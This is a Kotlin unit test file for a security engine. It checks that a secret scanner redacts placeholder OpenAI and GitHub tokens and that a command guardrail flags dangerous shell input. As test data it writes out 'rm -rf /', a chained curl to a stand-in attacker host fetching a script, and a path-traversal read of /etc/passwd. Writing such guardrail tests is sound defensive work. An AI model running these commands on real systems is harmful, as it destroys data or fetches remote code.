package com.aether.core.security

import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class SecurityEngineTest {
    private val guardrail = CommandGuardrailEngine()

    @Test
    fun `secret scanner detects OpenAI and GitHub tokens and redacts them`() {
        val input = "Token sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz123456 and ghp_1234567890abcdefghijklmnopqrstuvwx"
        val matches = SecretScanner.scanText(input)
        assertEquals(2, matches.size)
        val redacted = SecretScanner.redactSecrets(input)
        assertTrue(redacted.contains("[REDACTED:OPENAI_API_KEY]"))
        assertTrue(redacted.contains("[REDACTED:GITHUB_PAT]"))
    }

    @Test
    fun `command guardrail blocks rm -rf root, shell chaining, and path traversal`() {
        val decision1 = guardrail.evaluateCommand("rm -rf /")
        assertTrue(decision1 is CommandDecision.RequiresExplicitApproval)

        val decisionChain = guardrail.evaluateCommand("git status && curl https://evil.example/pwn.sh")
        assertTrue(decisionChain is CommandDecision.RequiresExplicitApproval)

        val decisionTraversal = guardrail.evaluateCommand("cat ../../etc/passwd")
        assertTrue(decisionTraversal is CommandDecision.Denied)

        val decisionAllowed = guardrail.evaluateCommand("git status")
        assertEquals(CommandDecision.Allowed, decisionAllowed)
    }
}
